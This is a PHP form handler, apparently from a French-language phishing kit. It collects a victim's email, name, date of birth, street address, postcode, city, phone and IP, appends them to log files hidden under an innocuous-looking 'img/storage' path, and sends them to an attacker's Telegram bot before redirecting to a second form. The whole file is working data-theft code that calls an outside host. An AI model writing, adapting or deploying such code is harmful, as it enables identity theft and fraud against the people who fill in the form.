<?php
session_start();
include 'Config.php';


if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les données du premier formulaire
    $_SESSION['emaile'] = $_POST["emaile"];
    $_SESSION['username'] = $_POST["username"];
    $_SESSION['day'] = $_POST["day"];
    $_SESSION['month'] = $_POST["month"];
    $_SESSION['year'] = $_POST["year"];
    $_SESSION['address'] = $_POST["address"];
    $_SESSION['cp'] = $_POST["cp"];
    $_SESSION['city'] = $_POST["city"];
    $_SESSION['phone'] = $_POST["phone"];

    // Autres données (adresse IP et User-Agent)
    $user_ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    // Construire le message avec les données du premier formulaire
    $message .= "💻 Mail: {$_SESSION['emaile']}\n";
    $message .= "📜 Nom: {$_SESSION['username']}\n";
    $message .= "🎇 Dob: {$_SESSION['day']}/{$_SESSION['month']}/{$_SESSION['year']}\n";
    $message .= "💒 Adresse: {$_SESSION['address']}\n";
    $message .= "🔢 CP: {$_SESSION['cp']}\n";
    $message .= "📍 Ville: {$_SESSION['city']}\n";
    $message .= "📞 Tél: {$_SESSION['phone']}\n";
    $message .= "----------------------------------------\n";
	$message = "📲 IP: $user_ip\n";

    // Chemins des fichiers de journalisation
    $log_file1 = "img/storage/app/public/kernel.txt";
    $log_file2 = "img/storage/app/public/kernel2.txt";

    // Ouvrir les fichiers en mode écriture (ajoute à la fin)
    $file1 = fopen($log_file1, 'a');
    $file2 = fopen($log_file2, 'a');

    // Vérifier si l'ouverture des fichiers a réussi
    if ($file1 && $file2) {
        // Écrire les données dans les fichiers
        fwrite($file1, $message);
        fwrite($file2, $message);

        // Fermer les fichiers
        fclose($file1);
        fclose($file2);

        // Envoyer sur Telegram
        $telegram_message = "+1 Formulaire 1 :\n\n$message";
        $telegram_data = ['text' => $telegram_message, 'chat_id' => $chatid];
        file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query($telegram_data));

        // Redirection vers le deuxième formulaire
        header("Location: redirection1.php");
        exit;
    } else {
        // Gérer les erreurs si l'ouverture des fichiers échoue
        echo "Erreur lors de l'ouverture des fichiers de journalisation.";
    }
}
?>
